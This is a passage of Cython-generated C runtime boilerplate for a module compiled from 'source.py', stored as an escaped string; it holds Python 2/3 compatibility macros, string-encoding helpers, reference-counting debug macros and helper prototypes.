PyThread_tss_delete(Py_tss_t *key) {\n  PyThread_delete_key(*key);\n  *key = Py_tss_NEEDS_INIT;\n}\nstatic CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {\n  return PyThread_set_key_value(*key, value);\n}\nstatic CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {\n  return PyThread_get_key_value(*key);\n}\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)\n#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))\n#else\n#define __Pyx_PyDict_NewPresized(n)  PyDict_New()\n#endif\n#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)\n#else\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_""HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS\n#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)\n#else\n#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)\n#endif\n#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)\n  #define CYTHON_PEP393_ENABLED 1\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_READY(op)       (0)\n  #else\n    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\\\n                                                0 : _PyUnicode_Ready((PyObject *)(op)))\n  #endif\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)\n  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)\n  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)\n  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))\n  #else\n    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))\n    #else\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))\n    #endif\n  #endif\n#else\n  #define CYTHON_PEP393_ENABLED 0\n  #define PyUnicode_1BYTE_KIND  1\n  #define PyUnicode_2BYTE_KIND  2\n  #define PyUnicode_4BYTE_KIND  4\n  #define __Pyx_PyUnicode_READY(op)       (0)\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u) ""  ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)\n  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))\n  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))\n  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)\n  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))\n#endif\n#if CYTHON_COMPILING_IN_PYPY\n  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)\n#else\n  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\\\n      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)\n  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)\n  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)\n  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, \"__format__\", \"O\", fmt)\n#endif\n#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))\n#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)\n#else\n  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)\n#endif\n#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)\n  #define PyObject_ASCII(o)            PyObject_Repr(o)\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyBaseString_Type            PyUnicod""e_Type\n  #define PyStringObject               PyUnicodeObject\n  #define PyString_Type                PyUnicode_Type\n  #define PyString_Check               PyUnicode_Check\n  #define PyString_CheckExact          PyUnicode_CheckExact\n#ifndef PyObject_Unicode\n  #define PyObject_Unicode             PyObject_Str\n#endif\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)\n  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)\n#else\n  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))\n  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))\n#endif\n#ifndef PySet_CheckExact\n  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)\n#endif\n#if PY_VERSION_HEX >= 0x030900A4\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)\n#else\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)\n#endif\n#if CYTHON_ASSUME_SAFE_MACROS\n  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)\n#else\n  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyIntObject                  PyLongObject\n  #define PyInt_Type                   PyLong_Type\n  #define PyInt_Check(op)              PyLong_Check(op)\n  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)\n  #define PyInt_FromString             PyLong_FromString\n  #define PyInt_FromUnicode            PyLong_FromUnicode\n  #define PyInt_FromLong               PyLong_FromLong\n  #define PyInt_FromSize_t             PyLong_FromSize_t\n  #define PyInt_FromSsize_t            PyLong_FromSsize_t\n  #define PyInt_AsLong                 PyLong_AsLong\n  #define PyInt_AS_LONG                PyLong_AS_LONG\n  #define PyInt_AsSsize_t              PyLong_AsSsize_t\n  #define PyInt_AsUnsignedLongMa""sk     PyLong_AsUnsignedLongMask\n  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask\n  #define PyNumber_Int                 PyNumber_Long\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyBoolObject                 PyLongObject\n#endif\n#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY\n  #ifndef PyUnicode_InternFromString\n    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)\n  #endif\n#endif\n#if PY_VERSION_HEX < 0x030200A4\n  typedef long Py_hash_t;\n  #define __Pyx_PyInt_FromHash_t PyInt_FromLong\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t\n#else\n  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))\n#else\n  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)\n#endif\n#if CYTHON_USE_ASYNC_SLOTS\n  #if PY_VERSION_HEX >= 0x030500B1\n    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods\n    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)\n  #else\n    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))\n  #endif\n#else\n  #define __Pyx_PyType_AsAsync(obj) NULL\n#endif\n#ifndef __Pyx_PyAsyncMethodsStruct\n    typedef struct {\n        unaryfunc am_await;\n        unaryfunc am_aiter;\n        unaryfunc am_anext;\n    } __Pyx_PyAsyncMethodsStruct;\n#endif\n\n#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)\n  #if !defined(_USE_MATH_DEFINES)\n    #define _USE_MATH_DEFINES\n  #endif\n#endif\n#include <math.h>\n#ifdef NAN\n#define __PYX_NAN() ((float) NAN)\n#else\nstatic CYTHON_INLINE float __PYX_NAN() {\n  float value;\n  memset(&value, 0xFF, sizeof(value));\n  return value;\n}\n#endif\n#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)\n#define __Pyx_truncl trunc\n#else\n#define __Pyx_truncl truncl\n#endif\n\n#define __P""YX_MARK_ERR_POS(f_index, lineno) \\\n    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }\n#define __PYX_ERR(f_index, lineno, Ln_error) \\\n    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }\n\n#ifndef __PYX_EXTERN_C\n  #ifdef __cplusplus\n    #define __PYX_EXTERN_C extern \"C\"\n  #else\n    #define __PYX_EXTERN_C extern\n  #endif\n#endif\n\n#define __PYX_HAVE__source\n#define __PYX_HAVE_API__source\n/* Early includes */\n#ifdef _OPENMP\n#include <omp.h>\n#endif /* _OPENMP */\n\n#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)\n#define CYTHON_WITHOUT_ASSERTIONS\n#endif\n\ntypedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;\n                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;\n\n#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0\n#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0\n#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)\n#define __PYX_DEFAULT_STRING_ENCODING \"\"\n#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString\n#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\n#define __Pyx_uchar_cast(c) ((unsigned char)c)\n#define __Pyx_long_cast(x) ((long)x)\n#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\\\n    (sizeof(type) < sizeof(Py_ssize_t))  ||\\\n    (sizeof(type) > sizeof(Py_ssize_t) &&\\\n          likely(v < (type)PY_SSIZE_T_MAX ||\\\n                 v == (type)PY_SSIZE_T_MAX)  &&\\\n          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\\\n                                v == (type)PY_SSIZE_T_MIN)))  ||\\\n    (sizeof(type) == sizeof(Py_ssize_t) &&\\\n          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\\\n                               v == (type)PY_SSIZE_T_MAX)))  )\nstatic CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py""_ssize_t limit) {\n    return (size_t) i < (size_t) limit;\n}\n#if defined (__cplusplus) && __cplusplus >= 201103L\n    #include <cstdlib>\n    #define __Pyx_sst_abs(value) std::abs(value)\n#elif SIZEOF_INT >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) abs(value)\n#elif SIZEOF_LONG >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) labs(value)\n#elif defined (_MSC_VER)\n    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))\n#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define __Pyx_sst_abs(value) llabs(value)\n#elif defined (__GNUC__)\n    #define __Pyx_sst_abs(value) __builtin_llabs(value)\n#else\n    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)\n#endif\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);\n#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))\n#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)\n#define __Pyx_PyBytes_FromString        PyBytes_FromString\n#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);\n#if PY_MAJOR_VERSION < 3\n    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\n#else\n    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize\n#endif\n#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsSString(s)    ((const signed"" char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)\n#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)\n#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)\n#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)\n#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)\nstatic CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {\n    const Py_UNICODE *u_end = u;\n    while (*u_end++) ;\n    return (size_t)(u_end - u - 1);\n}\n#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))\n#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode\n#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode\n#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)\n#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);\n#define __Pyx_PySequence_Tuple(obj)\\\n    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_""t(size_t);\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);\n#if CYTHON_ASSUME_SAFE_MACROS\n#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))\n#else\n#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)\n#endif\n#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))\n#if PY_MAJOR_VERSION >= 3\n#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))\n#else\n#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))\n#endif\n#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\nstatic int __Pyx_sys_getdefaultencoding_not_ascii;\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\n    PyObject* sys;\n    PyObject* default_encoding = NULL;\n    PyObject* ascii_chars_u = NULL;\n    PyObject* ascii_chars_b = NULL;\n    const char* default_encoding_c;\n    sys = PyImport_ImportModule(\"sys\");\n    if (!sys) goto bad;\n    default_encoding = PyObject_CallMethod(sys, (char*) \"getdefaultencoding\", NULL);\n    Py_DECREF(sys);\n    if (!default_encoding) goto bad;\n    default_encoding_c = PyBytes_AsString(default_encoding);\n    if (!default_encoding_c) goto bad;\n    if (strcmp(default_encoding_c, \"ascii\") == 0) {\n        __Pyx_sys_getdefaultencoding_not_ascii = 0;\n    } else {\n        char ascii_chars[128];\n        int c;\n        for (c = 0; c < 128; c++) {\n            ascii_chars[c] = c;\n        }\n        __Pyx_sys_getdefaultencoding_not_ascii = 1;\n        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);\n        if (!ascii_chars_u) goto bad;\n        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);\n        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {\n            PyErr_For""mat(\n                PyExc_ValueError,\n                \"This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.\",\n                default_encoding_c);\n            goto bad;\n        }\n        Py_DECREF(ascii_chars_u);\n        Py_DECREF(ascii_chars_b);\n    }\n    Py_DECREF(default_encoding);\n    return 0;\nbad:\n    Py_XDECREF(default_encoding);\n    Py_XDECREF(ascii_chars_u);\n    Py_XDECREF(ascii_chars_b);\n    return -1;\n}\n#endif\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)\n#else\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\nstatic char* __PYX_DEFAULT_STRING_ENCODING;\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\n    PyObject* sys;\n    PyObject* default_encoding = NULL;\n    char* default_encoding_c;\n    sys = PyImport_ImportModule(\"sys\");\n    if (!sys) goto bad;\n    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) \"getdefaultencoding\", NULL);\n    Py_DECREF(sys);\n    if (!default_encoding) goto bad;\n    default_encoding_c = PyBytes_AsString(default_encoding);\n    if (!default_encoding_c) goto bad;\n    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);\n    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;\n    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);\n    Py_DECREF(default_encoding);\n    return 0;\nbad:\n    Py_XDECREF(default_encoding);\n    return -1;\n}\n#endif\n#endif\n\n\n/* Test for GCC > 2.95 */\n#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))\n  #define likely(x)   __builtin_expect(!!(x), 1)\n  #define unlikely(x) __builtin_expect(!!(x), 0)\n#else /* !__GNUC__ or GCC < 2.95 */\n  #define likely(x)   (x)\n  #define unlikely""(x) (x)\n#endif /* __GNUC__ */\nstatic CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }\n\nstatic PyObject *__pyx_m = NULL;\nstatic PyObject *__pyx_d;\nstatic PyObject *__pyx_b;\nstatic PyObject *__pyx_cython_runtime = NULL;\nstatic PyObject *__pyx_empty_tuple;\nstatic PyObject *__pyx_empty_bytes;\nstatic PyObject *__pyx_empty_unicode;\nstatic int __pyx_lineno;\nstatic int __pyx_clineno = 0;\nstatic const char * __pyx_cfilenm= __FILE__;\nstatic const char *__pyx_filename;\n\n\nstatic const char *__pyx_f[] = {\n  \"source.py\",\n};\n\n/*--- Type declarations ---*/\n\n/* --- Runtime support code (head) --- */\n/* Refnanny.proto */\n#ifndef CYTHON_REFNANNY\n  #define CYTHON_REFNANNY 0\n#endif\n#if CYTHON_REFNANNY\n  typedef struct {\n    void (*INCREF)(void*, PyObject*, int);\n    void (*DECREF)(void*, PyObject*, int);\n    void (*GOTREF)(void*, PyObject*, int);\n    void (*GIVEREF)(void*, PyObject*, int);\n    void* (*SetupContext)(const char*, int, const char*);\n    void (*FinishContext)(void**);\n  } __Pyx_RefNannyAPIStruct;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);\n  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;\n#ifdef WITH_THREAD\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\n          if (acquire_gil) {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          } else {\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\n          }\n#else\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\n          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)\n#endif\n  #define __Pyx_RefNannyFinishContext()\\\n          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)""\n  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)\n  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)\n  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)\n  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)\n#else\n  #define __Pyx_RefNannyDeclarations\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\n  #define __Pyx_RefNannyFinishContext()\n  #define __Pyx_INCREF(r) Py_INCREF(r)\n  #define __Pyx_DECREF(r) Py_DECREF(r)\n  #define __Pyx_GOTREF(r)\n  #define __Pyx_GIVEREF(r)\n  #define __Pyx_XINCREF(r) Py_XINCREF(r)\n  #define __Pyx_XDECREF(r) Py_XDECREF(r)\n  #define __Pyx_XGOTREF(r)\n  #define __Pyx_XGIVEREF(r)\n#endif\n#define __Pyx_XDECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_XDECREF(tmp);\\\n    } while (0)\n#define __Pyx_DECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_DECREF(tmp);\\\n    } while (0)\n#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)\n#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)\n\n/* PyObjectGetAttrStr.proto */\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);\n#else\n#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)\n#endif\n\n/* Import.proto */\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);\n\n/* GetAttr.proto */\nstatic CYTHON_""INLINE PyObject *__Pyx_GetAttr(PyObject *, PyObject *);\n\n/* Globals.proto */\nstatic PyObject* __Pyx_Globals(void);\n\n/* PyExec.proto */\nstatic PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);\nstatic CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);\n\n/* PyExecGlobals.proto */\nstatic PyObject* __Pyx_PyExecGlobals(PyObject*);\n\n/* GetBuiltinName.proto */\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name);\n\n/* PyDictVersioning.proto */\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\n#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)\n#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\\\n    (version_var) = __PYX_GET_DICT_VERSION(dict);\\\n    (cache_var) = (value);\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\\\n        (VAR) = __pyx_dict_cached_value;\\\n    } else {\\\n        (VAR) = __pyx_dict_cached_value = (LOOKUP);\\\n        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\\\n    }\\\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);\n#else\n#define __PYX_GET_DICT_VERSION(dict)  (0)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);\n#endif\n\n/* GetModuleGlobalName.proto */\n#if CYTHON_USE_DICT_VERSIONS\n#define __Pyx_GetModuleGlobalName(var, name)  do {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    (var) = (likely(__pyx_di""ct_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\\\n        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\\\n        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\\\n    PY_UINT64_T __pyx_dict_version;\\\n    PyObject 